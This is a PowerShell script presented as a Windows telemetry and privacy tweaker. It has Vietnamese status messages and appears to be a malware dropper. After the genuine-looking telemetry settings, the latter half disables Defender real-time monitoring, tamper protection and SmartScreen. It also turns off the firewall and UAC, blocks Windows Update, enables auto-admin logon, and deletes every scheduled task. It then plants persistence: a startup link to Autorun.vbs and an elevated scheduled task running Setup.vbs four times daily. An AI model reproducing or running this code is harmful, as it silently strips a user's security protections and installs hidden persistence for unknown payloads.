$DisableSysMain           = $false
$BlockAggressiveHosts     = $false
$AddFirewallBlocks        = $true
$CreateRestorePoint       = $false
$DisableWERQueueTask          = $true
$LimitDeliveryOptimization    = $true
$TurnOffDefenderCloud         = $false
$HardDisableSmartScreen       = $true
$DisableLocation              = $true
$DisableOnlineSpeech          = $true
$DisableFindMyDevice          = $true
$DisableEdgeTelemetry         = $true
$DisableOfficeTelemetry       = $true
$DisableNewsWidgetsSpotlight  = $true
$DisableSharedExperience      = $true
$DisableOneDrive              = $true
try {
  if ($CreateRestorePoint) {
    Checkpoint-Computer -Description "Disable-Telemetry" -RestorePointType "MODIFY_SETTINGS" | Out-Null
  }
} catch { Write-Host "Không thể tạo Restore Point (bỏ qua): $($_.Exception.Message)" -ForegroundColor DarkYellow }
function Set-RegDword($Path, $Name, $Value) {
  New-Item -Path $Path -Force | Out-Null
  New-ItemProperty -Path $Path -Name $Name -PropertyType DWord -Value $Value -Force | Out-Null
}
function Set-RegString($Path, $Name, $Value) {
  New-Item -Path $Path -Force | Out-Null
  New-ItemProperty -Path $Path -Name $Name -PropertyType String -Value $Value -Force | Out-Null
}
$services = @(
  "diagtrack",
  "dmwappushservice",
  "WerSvc",
  "RetailDemo"
)
if ($DisableSysMain) { $services += "SysMain" }

foreach ($svc in $services) {
  $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
  if ($s) {
    try {
      if ($s.Status -ne 'Stopped') { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue }
      Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
      Write-Host "Service $($svc) -> Disabled"
    } catch { Write-Host "Service $($svc): $($_.Exception.Message)" -ForegroundColor DarkYellow }
  }
}
$tasks = @(
  "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser",
  "\Microsoft\Windows\Application Experience\ProgramDataUpdater",
  "\Microsoft\Windows\Application Experience\AitAgent",
  "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator",
  "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip",
  "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector",
  "\Microsoft\Windows\Autochk\Proxy",
  "\Microsoft\Windows\Feedback\Siuf\DmClient",
  "\Microsoft\Windows\Feedback\Siuf\DmClientOnScenario"
)
foreach ($t in $tasks) {
  try {
    $path = (Split-Path $t -Parent) + "\"
    $name = Split-Path $t -Leaf
    Disable-ScheduledTask -TaskPath $path -TaskName $name -ErrorAction SilentlyContinue | Out-Null
    Write-Host "Task $($t) -> Disabled"
  } catch { Write-Host "Task $($t): $($_.Exception.Message)" -ForegroundColor DarkYellow }
}
Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" "AllowTelemetry" 0
Set-RegDword "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" "AllowTelemetry" 0
Set-RegDword "HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy" "TailoredExperiencesWithDiagnosticDataEnabled" 0
Set-RegDword "HKCU:\SOFTWARE\Microsoft\Input\TIPC" "Enabled" 0
Set-RegDword "HKCU:\Software\Microsoft\InputPersonalization" "RestrictImplicitTextCollection" 1
Set-RegDword "HKCU:\Software\Microsoft\InputPersonalization" "RestrictImplicitInkCollection" 1
Set-RegDword "HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" "Enabled" 0
New-Item "HKCU:\Software\Microsoft\Siuf\Rules" -Force | Out-Null
Set-RegDword "HKCU:\Software\Microsoft\Siuf\Rules" "NumberOfSIUFInPeriod" 0
Set-RegDword "HKCU:\Software\Microsoft\Siuf\Rules" "PeriodInNanoSeconds" 0
Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" "PublishUserActivities" 0
Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" "UploadUserActivities" 0
Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" "AllowCortana" 0
Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" "AllowCortanaAboveLock" 0
Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" "DisableWebSearch" 1
Set-RegDword "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" "BingSearchEnabled" 0
Set-RegDword "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" "CortanaConsent" 0
Set-RegDword "HKCU:\Software\Microsoft\Windows\CurrentVersion\SearchSettings" "IsDeviceSearchHistoryEnabled" 0
Set-RegDword "HKCU:\Software\Microsoft\Windows\CurrentVersion\SearchSettings" "IsCloudHistoryEnabled" 0
Set-RegDword "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" "CloudSearchEnabled" 0
Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" "DisableTailoredExperiencesWithDiagnosticData" 1
if ($BlockAggressiveHosts) {
  $hosts = "$env:WinDir\System32\drivers\etc\hosts"
  $entries = @(
    "0.0.0.0 vortex-win.data.microsoft.com",
    "0.0.0.0 settings-win.data.microsoft.com",
    "0.0.0.0 telecommand.telemetry.microsoft.com",
    "0.0.0.0 telemetry.microsoft.com",
    "0.0.0.0 v10.vortex-win.data.microsoft.com",
    "0.0.0.0 watson.telemetry.microsoft.com",
    "0.0.0.0 browser.events.data.msn.com"
  )
  $content = Get-Content $hosts -ErrorAction SilentlyContinue
  foreach ($e in $entries) {
    if ($content -notcontains $e) { Add-Content -Path $hosts -Value $e }
  }
  Write-Host "Đã ghi thêm mục vào hosts (BlockAggressiveHosts = ON)."
}
if ($AddFirewallBlocks) {
  $fwRules = @(
    @{Name="Block Telemetry (DiagTrack)"; Program="$env:WinDir\System32\svchost.exe"},
    @{Name="Block CompatTelRunner";      Program="$env:WinDir\System32\CompatTelRunner.exe"}
  )
  foreach ($r in $fwRules) {
    if (-not (Get-NetFirewallApplicationFilter -PolicyStore ActiveStore -ErrorAction SilentlyContinue | Where-Object {$_.Program -ieq $r.Program})) {
      New-NetFirewallRule -DisplayName $r.Name -Direction Outbound -Program $r.Program -Action Block -Profile Any -Enabled True | Out-Null
      Write-Host "Firewall rule: $($r.Name) -> Added"
    }
  }
}
if ($DisableWERQueueTask) {
  try { Disable-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Error Reporting\" -TaskName "QueueReporting" -ErrorAction SilentlyContinue | Out-Null } catch {}
}
if ($LimitDeliveryOptimization) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" "DODownloadMode" 0
}
if ($TurnOffDefenderCloud) {
  try { Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}
}
if ($HardDisableSmartScreen) {
  New-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Force | Out-Null
  New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -PropertyType String -Value "Off" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" "EnableSmartScreen" 0
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Edge" "SmartScreenEnabled" 0
}
if ($DisableLocation) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" "DisableLocation" 1
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" "DisableWindowsLocationProvider" 1
}
if ($DisableOnlineSpeech) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Speech" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Speech" "AllowOnlineSpeechRecognition" 0
  New-Item "HKCU:\Software\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" -Force | Out-Null
  Set-RegDword "HKCU:\Software\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" "HasAccepted" 0
}
if ($DisableFindMyDevice) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\FindMyDevice" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\FindMyDevice" "AllowFindMyDevice" 0
}
if ($DisableEdgeTelemetry) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Edge" "MetricsReportingEnabled" 0
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Edge" "UserFeedbackAllowed" 0
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Edge" "SearchSuggestEnabled" 0
}
if ($DisableOfficeTelemetry) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Common\Feedback" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Common\Feedback" "Enabled" 0
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Common\Feedback" "IncludeInsider" 0
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Common\Feedback" "SurveyEnabled" 0
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Common" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Office\16.0\Common" "QMEnable" 0
}
if ($DisableNewsWidgetsSpotlight) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds" "EnableFeeds" 0
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" "DisableWindowsSpotlightFeatures" 1
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" "DisableWindowsSpotlightOnSettings" 1
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" "DisableConsumerFeatures" 1
}
if ($DisableSharedExperience) {
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" "EnableCdp" 0
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" "AllowCrossDeviceClipboard" 0
}
if ($DisableOneDrive) {
  New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -Force | Out-Null
  Set-RegDword "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" "DisableFileSyncNGSC" 1
  Stop-Process -Name OneDrive -Force -ErrorAction SilentlyContinue
}
Set-MpPreference -PUAProtection 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
$source = "C:\Users\Public\Downloads\Autorun.vbs"
$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($destination)
$shortcut.TargetPath = $source
$shortcut.Save()
$ShortcutPath = "C:\Users\Public\Downloads\Startup Folder.lnk"
$TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $TargetPath
$Shortcut.Save()
$folder = "C:\Users\Public\Downloads\Startup Folder.lnk"
$acl = Get-Acl $folder
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete", "Deny")
$acl.AddAccessRule($accessRule)
Set-Acl -Path $folder -AclObject $acl
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired" -Name * -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true
Stop-Service -Name wuauserv -Force
Set-Service -Name wuauserv -StartupType Disabled
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'
Set-Service -Name wuauserv -StartupType Disabled
$pause = (Get-Date).AddDays(35)
$pause = $pause.ToUniversalTime().ToString( "2099-12-31T00:00:00Z" )
$pause_start = (Get-Date)
$pause_start = $pause_start.ToUniversalTime().ToString( "yyyy-MM-ddTHH:mm:ssZ" )
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesExpiryTime' -Value $pause                        
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesStartTime' -Value $pause_start
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesEndTime' -Value $pause
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesStartTime' -Value $pause_start
Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesEndTime' -Value $pause
Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesStartTime' -Value $pause_start
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Force
New-ItemProperty -Path  'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'NoAutoUpdate' -PropertyType DWORD -Value 1
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Set-MpPreference -DisableRealtimeMonitoring $true
Remove-Item -Path C:\Windows\SoftwareDistribution\Download\* -Recurse -Force
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device" /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoRebootWithLoggedOnUsers /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name NoAutoUpdate -Value 1 -Force
Stop-Service -Name UsoSvc -Force
schtasks /Change /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot" /DISABLE
schtasks /Query /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot"
Get-ScheduledTask | Where-Object {$_.TaskPath -like "\Microsoft\Windows\WindowsUpdate*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -like "*restart*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
Clear-RecycleBin -Force
$taskName = "Run Setup.vbs Daily"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
$trigger1 = New-ScheduledTaskTrigger -Daily -At 00:00AM
$trigger2 = New-ScheduledTaskTrigger -Daily -At 6:00AM
$trigger3 = New-ScheduledTaskTrigger -Daily -At 12:00PM
$trigger4 = New-ScheduledTaskTrigger -Daily -At 6:00PM
$principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2, $trigger3, $trigger4) -Principal $principal -Force
exit
